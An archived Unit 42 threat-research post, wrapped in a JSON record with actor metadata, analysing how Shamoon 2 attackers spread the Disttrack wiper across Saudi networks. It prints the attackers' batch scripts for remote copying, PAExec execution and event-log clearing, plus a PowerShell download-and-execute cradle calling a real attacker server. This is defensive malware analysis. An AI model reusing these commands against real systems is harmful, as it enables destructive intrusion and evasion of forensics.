{
    "id": "83c5ae75-71ca-4b6c-b2bf-146cda163668",
    "created_at": "2023-01-12T15:09:41.99517Z",
    "updated_at": "2025-03-27T02:16:11.636183Z",
    "deleted_at": null,
    "sha1_hash": "276b86d8fa658e58498005334cb3c407e6f034cc",
    "title": "2017-03-26 - Shamoon 2- Delivering Disttrack",
    "authors": "",
    "file_creation_date": "2022-05-28T00:34:02Z",
    "file_modification_date": "2022-05-28T00:34:02Z",
    "file_size": 417709,
    "plain_text": "# Shamoon 2: Delivering Disttrack\n\n**researchcenter.paloaltonetworks.com/2017/03/unit42-shamoon-2-delivering-disttrack/**\n\nRobert Falcone, Bryan Lee March 26, 2017\n\nBy [Robert Falcone and](https://unit42.paloaltonetworks.com/author/robertfalcone/) [Bryan Lee](https://unit42.paloaltonetworks.com/author/bryanlee/)\n\nMarch 27, 2017 at 12:01 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [credential theft,](https://unit42.paloaltonetworks.com/tag/credential-theft/) [credential-based attacks,](https://unit42.paloaltonetworks.com/tag/credential-based-attacks/) [Disttrack,](https://unit42.paloaltonetworks.com/tag/disttrack/) [magic hound,](https://unit42.paloaltonetworks.com/tag/magic-hound/) [payload,](https://unit42.paloaltonetworks.com/tag/payload/) [Phishing,](https://unit42.paloaltonetworks.com/tag/phishing/) [Saudi Arabia,](https://unit42.paloaltonetworks.com/tag/saudi-arabia/) [Shamoon 2](https://unit42.paloaltonetworks.com/tag/shamoon-2/)\n\n[Since late November 2016, the Shamoon 2 attack campaign has brought three waves of destructive attacks to organizations within Saudi](https://blog.paloaltonetworks.com/tag/shamoon-2/)\nArabia. Our investigation into these attacks has unearthed more details into the method by which the threat actors delivered the Disttrack\npayload. We have found evidence that the actors use a combination of legitimate tools and batch scripts to deploy the Disttrack payload to\nhostnames known to the attackers to exist in the targeted network.\n\nOur analysis shows that the actors likely gathered the list of known hostnames directly from Active Directory or during their network\nreconnaissance activities conducted from a compromised host. This network reconnaissance, coupled with the credential theft needed to\nhardcode Disttrack payloads with legitimate username and password credentials, leads us to believe that it is highly likely the threat actors\nhad sustained access to the targeted networks prior to Shamoon 2 attacks. Our research confirms that successful credential theft from\ntargeted organizations was an integral part of the Shamoon 2 attackers’ playbook, and they used these stolen credentials for remote\naccess and lateral movement.\n\nOur analysis also shows an actor distributes Disttrack within the targeted network by first compromising a system that is used as the\nDisttrack distribution server on that network. The actor then uses this server to compromise other systems on the network by using the\nhostname to copy over and execute the Disttrack malware. On each of these named systems that are successfully compromised, the\nDisttrack malware will attempt to propagate itself to 256 additional IP addresses on the local network. This rudimentary, but effective,\ndistribution system can enable Disttrack to propagate to additional systems from a single, initially compromised system in a semiautomated fashion.\n\n[In this posting we also explore a possible connection between Shamoon 2 and the Magic Hound campaign, where we outline evidence of](https://blog.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/)\na potential connection between these two attack campaigns. Furthermore, we explore a possible scenario on how these two attack\ncampaigns could have worked in conjunction with each other to execute the Shamoon 2 attacks.\n\n## Delivery Method\n\n\n-----\n\n[Since our initial blog discussing the reemergence of Shamoon in November 2016, we were curious how the threat actor initially delivers](https://blog.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)\nthe Disttrack payload to the targeted network. We were equally curious about how Disttrack was so effective at causing mass destruction\n[on targeted networks, as we mentioned in our initial blog that the Disttrack Trojan itself is only able to spread to 256 IP addresses on the](https://blog.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)\nsame local network as the compromised host.\n\n[From gathering files associated in the third wave of Shamoon 2 attacks, we found a Zip archive that contains files which the attacker used](https://blog.paloaltonetworks.com/2017/01/unit42-threat-brief-shamoon-2-wave-3-attacks/)\nto infect other systems on the targeted network from a single compromised system they then use as a Disttrack distribution server. The\nactor deploys the Zip archive to this distribution server by logging in to the compromised system using Remote Desktop Protocol (RDP)\nwith stolen, legitimate credentials and downloading the Zip from a remote server. The actor uses this single compromised system to\ndistribute Disttrack to other systems in different parts of the network, where the Disttrack Trojan would attempt to spread to 256 other\nsystems on each local network. The chart in Figure 1 visualizes the delivery of Disttrack at a high level.\n\n[Watch Video At:](https://youtu.be/Yk5ay47yWjw) https://youtu.be/Yk5ay47yWjw\n\n_Figure 1 High-level view of Disttrack deployment in Shamoon 2 attack_\n\n## Distributing Disttrack\n\nAs mentioned before, we obtained files used by the threat actors to deploy the Disttrack payload to additional systems on the network.\nWhile we do not know exactly how the threat actor initially compromised and gained RDP access to the Disttrack distribution server, we\nbelieve the actor downloads a Zip archive contained a number of files to this system, including files with names listed in Table 1. The set of\nfiles saved to the distribution server includes executables, batch scripts and text files. We will explain the purpose and contents of each of\nthese files and how the actor uses them in the deployment of Disttrack.\n\n**Filename** **Description**\n\n\nexectemplate.txt\n\n\nLauncher commands (not a batch script) the actor runs to launch the deployment of the Disttrack payload onto\nadditional systems at the targeted organization\n\n\n1.txt – 400.txt Sequentially named text files containing DNS values for hostnames of systems on targeted network\n\nok.bat Deployment batch script\n\nntertmgr32.bat Disttrack installation batch script\n\nntertmgr32.exe Disttrack payload\n\npa.exe PAExec, Power Admin’s open source PsExec alternative\n\n_Table 1 Files associated with the Disttrack Distribution Server_\n\nWhen deploying Disttrack on the targeted network, the threat actor runs the commands stored in the exec-template.txt file that reads in the\ncontents of each of the “1.txt” through “400.txt” text files, which contain a list of hostnames of systems on the network, one hostname per\nline. The commands then run the “ok.bat” deployment batch script once for each hostname from the text files. Figure 2 shows the contents\nof the “exec-template.txt” launcher script, which uses for loops to run the deployment batch script using each hostname within the text files\nas an argument (lines removed for brevity).\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nfor /F %J in (1.txt) do ok.bat %J\nfor /F %J in (2.txt) do ok.bat %J\nfor /F %J in (3.txt) do ok.bat %J\nfor /F %J in (4.txt) do ok.bat %J\nfor /F %J in (5.txt) do ok.bat %J\nfor /F %J in (6.txt) do ok.bat %J\nfor /F %J in (7.txt) do ok.bat %J\nfor /F %J in (8.txt) do ok.bat %J\nfor /F %J in (9.txt) do ok.bat %J\nfor /F %J in (10.txt) do ok.bat %J\nfor /F %J in (11.txt) do ok.bat %J\nfor /F %J in (12.txt) do ok.bat %J\nfor /F %J in (13.txt) do ok.bat %J\nfor /F %J in (14.txt) do ok.bat %J\nfor /F %J in (15.txt) do ok.bat %J\n..snip..\nfor /F %J in (399.txt) do ok.bat %J\nfor /F %J in (400.txt) do ok.bat %J\n\n\n_Figure 2 Contents of the exec-template.txt batch script_\n\nAt first, we believed the actor would change the file extension of the exec-template.txt file to “.bat” and execute it as a batch script. We no\nlonger believe this is the case as the “for” commands contained within exec-template.txt reference variables using a single percent symbol,\n[specifically “%J” as seen in Figure 2. This causes a syntax error if executed within a batch script. According to MSDN, to execute these](https://technet.microsoft.com/en-us/library/bb490909.aspx)\n“for” commands within a batch script, the actor would have to use two percent symbols, specifically “%%J” in this case. We now believe\nthat the threat actor manually copies the contents of exec-template.txt and pastes these commands directly within command prompt to run\nthem.\n\nWe cannot show the contents of the “1.txt” through “400.txt” files, as they contain new-line-delimited lists of the DNS names for hosts\nspecific to the targeted organizations.\n\nIn the files we obtained from the Disttrack distribution server, there were only 29 instead of 400 text files, each of which contained 30\nhostnames, except for the last one only containing four for a total of 844 hostnames. In the text files we analyzed, the hostnames were\nincluded as their DNS name, specifically in the format <computer name>.<domain name>.local, which we believe shows they were\nobtained directly from Active Directory on a domain controller. The importance of including the DNS names for these hosts on the network\nis that is allows the actor to connect to these systems in subsequent commands.\n\nThe “ok.bat” batch script runs once per hostname mentioned above. This batch script is responsible for deploying Disttrack on each of\nthese systems on the network. The script begins by copying two files to the “C:\\Windows\\temp” folder on the remote system. The two\ncopied files – named “ntertmgr32.exe” and “ntertmgr32.bat” – are the Disttrack payload and a batch script used to install the Disttrack\npayload on the local system, respectively. The “ok.bat” script uses the PAExec (“pa.exe”) application to run the “ntertmgr32.bat” installation\nscript on the remote system. The batch script also attempts to clear event logs via the Windows built-in “wevtutil” utility in an attempt to\nconceal their activities and disrupt incident response and forensic analysis. Figure 3 shows the contents of the “ok.bat” script. Interestingly,\nthe actor included an argument “-r SVCNSS”, which is an invalid argument for PAExec and the actor would need to remove it prior to\ndistribution. The “-r” argument is a valid argument within Microsoft’s PsExec that specifies the name of the remote service to create,\nsuggesting the threat actors may have also used the PsExec application for distribution as well.\n\n\n1\n2\n3\n4\n\n\ncopy /Y ntertmgr32.bat \\\\%1\\C$\\Windows\\temp\\\ncopy /Y ntertmgr32.exe \\\\%1\\C$\\Windows\\temp\\\npa.exe \\\\%1 -r SVCNSS -s -d C:\\\\Windows\\temp\\ntertmgr32.bat\nfor /F %%i in ('wevtutil el /r:%1' ) do (wevtutil cl /r:%1 %%i )\n\n\n_Figure 3 Contents of the ok.bat batch script_\n\nThe “ntertmgr32.bat” batch script that runs on each end system is responsible for installing the Disttrack payload as a service on the local\nsystem. The batch script, as seen in Figure 4, first copies the Disttrack payload (“ntertmgr32.exe”) to the “C:\\Windows\\System32” folder\nand then executes the newly copied file using the “start” command with “service” as an argument. This script not only installs but also\nlaunches the Disttrack payload.\n\n\n1\n2\n3\n4\n5\n6\n\n\n@echo off\nset u100=ntertmgr32.exe\nset u200=service\nset u800=%~dp0\ncopy /Y \"%u800%%u100%\" \"%systemroot%\\system32\\%u100%\"\nstart /b %systemroot%\\system32\\%u100% %u200%\n\n\n_Figure 4 Contents of the ntertmgr32.bat batch script_\n\n\n-----\n\nOnce the Disttrack payload executes, it will begin carrying out its functionality, specifically attempting to spread to other systems on the\n[local network and wiping systems at a pre-defined time in the future. As discussed in our initial blog on Shamoon 2, the Disttrack payload](https://blog.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/)\nwill attempt to infect additional systems on the same subnet (x.x.x.0-x.x.x.255) by logging in to the remote system, copying itself to the\nsystem, and executing the copied payload by creating a scheduled task to run the payload.\n\n## Disttrack Distribution System – Possible Link to Magic Hound\n\nAs mentioned earlier in this blog post, we know that the threat actor downloads several files to the distribution server to infect systems on\nthe network with Disttrack. In addition to the files mentioned in the previous section, it appears that the threat actor copied a PowerShell\nscript to the distribution server as well. This PowerShell script, seen in Figure 5, appears to have been generated by Metasploit’s\n“web_delivery” module to download and execute a payload from a remote server at 45.76.128[.]71, which we speculate was used to\ncreate a meterpreter session on the system.\n\n1 powershell.exe -nop -w hidden -c $L=new-object net.webclient;$L.proxy=\n\n[Net.WebRequest]::GetSystemWebProxy();$L.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX\n$L.downloadString(\"http://45.76.128.71:8080/[random string redacted]\");\n\n_Figure 5 PowerShell script used to download files to distribution system_\n\nThe server hosting the files has an IP address of 45.76.128[.]71, which resides within the IP range associated with a cloud hosting service\nthat allows customers to create server instances in specific geographic locations and configurations. According to GeoIP mapping data for\n45.76.128[.]71, it appears this IP range is geographically based in the London cloud instance. The use of this specific IP is interesting, as\nthe [Magic Hound campaign we previously reported on (February 2017) used a command and control (C2) server at 45.76.128[.]165, which](https://blog.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/)\nis on the same Class C IP range.\n\nWhile we cannot conclusively state the existence of a specific relationship between the Shamoon and Magic Hound adversaries, there are\nnow several factors that are suggestive of some form of association, including:\n\n1. Targeting of entities within Saudi Arabia.\n2. Use of the same cloud computing service in the same Class C IP range.\n3. Use of PowerShell and meterpreter.\n\nTaken together, these are all factors to consider when postulating a relationship between the Shamoon and Magic Hound attackers.\n[Furthermore, it is possible that these artifacts were some of the factors used by our peers at X-Force and](https://securityintelligence.com/the-full-shamoon-how-the-devastating-malware-was-inserted-into-networks/) [Kaspersky to tie the Magic](https://securelist.com/files/2017/03/Report_Shamoon_StoneDrill_final.pdf)\nHound attacks to Shamoon.\n\nIf the Magic Hound attacks are indeed related to the Shamoon attack cycle, we may be able to hypothesize that the Magic Hound attacks\nwere used as a beachhead to perform reconnaissance for the adversaries and gather network information and credentials. This may be\nfurther supported by the initial Magic Hound payloads we discovered, Pupy RAT and meterpreter, both of which have these types of\ncapabilities.\n\n## Conclusion\n\nWe have determined that the actors conducting the Shamoon 2 attacks use one compromised system as a distribution point to deploy the\ndestructive Disttrack Trojan to other systems on the targeted network, after which the Disttrack malware will seek to propagate itself even\nfurther into the network. Using an open source utility called PAExec and several batch scripts, the actor copies the Disttrack payload to\nother systems on the network, which we believe are discovered directly from Active Directory or through network reconnaissance\nactivities. Once the Disttrack payload has been deployed to these initial hosts, Disttrack will attempt to spread on their local networks to\namplify the impact of the attack. While the actors interact directly with the distribution system, the use of this single compromised system\nallows the actors to automate the deployment of the payload to quickly infect systems on the targeted network. Also, these findings\nprovide a possible relation between the Shamoon and Magic Hound attack campaigns. We will continue to analyze these attacks to\ndetermine further activities carried out by these actors and expose any additional correlations to known threat groups.\n\nThe theft and subsequent reuse of credentials is a common element in many attackers’ playbooks. We have recently published a white\n[paper, “Credential-Based Attacks: Exposing the Ecosystem and Motives Behind Credential Phishing, Theft and Abuse,” detailing how](https://blog.paloaltonetworks.com/2017/03/unit42-new-white-paper-preventing-credential-phishing-theft-abuse/)\ncredentials are stolen and later abused, with guidance on how you can defend yourself and your organization against this type of threat.\nCollectively, the Shamoon 2 attacks are a good example not only of ways attackers obtain stolen credentials but also of what they can do\nwith them.\n\n## Indicators of Compromise\n\n4919436d87d224f083c77228b48dadfc153ee7ad48dd7d22f0ba0d5090b5cf9b: exec-template.txt\n\n5475f35363e2f4b70d4367554f1691f3f849fb68570be1a580f33f98e7e4df4a: ok.bat\n\n01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc: pa.exe\n\nc7f937375e8b21dca10ea125e644133de3afc7766a8ca4fc8376470277832d95: ntertmgr32.bat\n\n\n-----\n\n**Ignite '17 Security Conference: Vancouver, BC June 12–15, 2017**\n\nIgnite '17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts,\ngain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security\nindustry. Visit the [Ignite website for more information on tracks, workshops and marquee sessions.](http://www.paloaltonetworksignite.com/)\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-03-26 - Shamoon 2- Delivering Disttrack.pdf"
    ],
    "report_names": [
        "2017-03-26 - Shamoon 2- Delivering Disttrack.pdf"
    ],
    "threat_actors": [
        {
            "id": "d8af157e-741b-4933-bb4a-b78490951d97",
            "created_at": "2023-01-06T13:46:38.748929Z",
            "updated_at": "2025-03-27T02:00:02.908256Z",
            "deleted_at": null,
            "main_name": "APT35",
            "aliases": [
                "Newscaster Team",
                "Magic Hound",
                "G0059",
                "Phosphorus",
                "Mint Sandstorm",
                "TunnelVision",
                "COBALT MIRAGE"
            ],
            "source_name": "MISPGALAXY:APT35",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08a3b64c-8e18-455d-af57-28dca63808c4",
            "created_at": "2024-05-01T02:03:08.027871Z",
            "updated_at": "2025-03-27T02:05:17.313679Z",
            "deleted_at": null,
            "main_name": "COBALT ILLUSION",
            "aliases": [
                "APT42 ",
                "Charming Kitten ",
                "CharmingCypress ",
                "ITG18 ",
                "Magic Hound ",
                "Mint Sandstorm sub-group ",
                "NewsBeef ",
                "Newscaster ",
                "PHOSPHORUS sub-group ",
                "TA453 ",
                "UNC788 ",
                "Yellow Garuda ",
                "APT35 "
            ],
            "source_name": "Secureworks:COBALT ILLUSION",
            "tools": [
                " MagicHound Toolset",
                " PupyRAT",
                "Browser Exploitation Framework (BeEF)"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3676dfe-3d40-4b3a-bfbd-4fc1f8c896f4",
            "created_at": "2022-10-25T15:50:23.808974Z",
            "updated_at": "2025-03-27T02:00:55.550912Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "Magic Hound",
                "TA453",
                "COBALT ILLUSION",
                "Charming Kitten",
                "ITG18",
                "Phosphorus",
                "APT35",
                "Mint Sandstorm"
            ],
            "source_name": "MITRE:Magic Hound",
            "tools": [
                "Impacket",
                "CharmPower",
                "FRP",
                "Mimikatz",
                "Systeminfo",
                "ipconfig",
                "netsh",
                "PowerLess",
                "Pupy",
                "DownPaper",
                "PsExec",
                "Havij",
                "sqlmap"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1699fb41-b83f-42ff-a6ec-984ae4a1031f",
            "created_at": "2022-10-25T16:07:23.83826Z",
            "updated_at": "2025-03-27T02:02:09.995863Z",
            "deleted_at": null,
            "main_name": "Magic Hound",
            "aliases": [
                "APT 35",
                "Ballistic Bobcat",
                "Charming Kitten",
                "CharmingCypress",
                "Cobalt Illusion",
                "Cobalt Mirage",
                "Educated Manticore",
                "Magic Hound",
                "Mint Sandstorm",
                "Operation BadBlood",
                "Operation Sponsoring Access",
                "Operation SpoofedScholars",
                "Operation Thamar Reservoir",
                "Phosphorus",
                "TA453",
                "TEMP.Beanie",
                "Tarh Andishan",
                "Timberworm",
                "TunnelVision",
                "UNC788",
                "Yellow Garuda"
            ],
            "source_name": "ETDA:Magic Hound",
            "tools": [
                "7-Zip",
                "AnvilEcho",
                "BASICSTAR",
                "CORRUPT KITTEN",
                "CWoolger",
                "CharmPower",
                "ChromeHistoryView",
                "CommandCam",
                "DistTrack",
                "DownPaper",
                "FRP",
                "Fast Reverse Proxy",
                "FireMalv",
                "Ghambar",
                "GoProxy",
                "GorjolEcho",
                "HYPERSCRAPE",
                "Havij",
                "MPK",
                "MPKBot",
                "Matryoshka",
                "Matryoshka RAT",
                "MediaPl",
                "Mimikatz",
                "MischiefTut",
                "NETWoolger",
                "NOKNOK",
                "PINEFLOWER",
                "POWERSTAR",
                "PowerLess Backdoor",
                "PsList",
                "Pupy",
                "PupyRAT",
                "SNAILPROXY",
                "Shamoon",
                "TDTESS",
                "WinRAR",
                "WoolenLogger",
                "Woolger",
                "pupy",
                "sqlmap"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536181,
    "ts_updated_at": 1743041771,
    "ts_creation_date": 1653698042,
    "ts_modification_date": 1653698042,
    "files": {
        "pdf": "https://archive.orkl.eu/276b86d8fa658e58498005334cb3c407e6f034cc.pdf",
        "text": "https://archive.orkl.eu/276b86d8fa658e58498005334cb3c407e6f034cc.txt",
        "img": "https://archive.orkl.eu/276b86d8fa658e58498005334cb3c407e6f034cc.jpg"
    }
}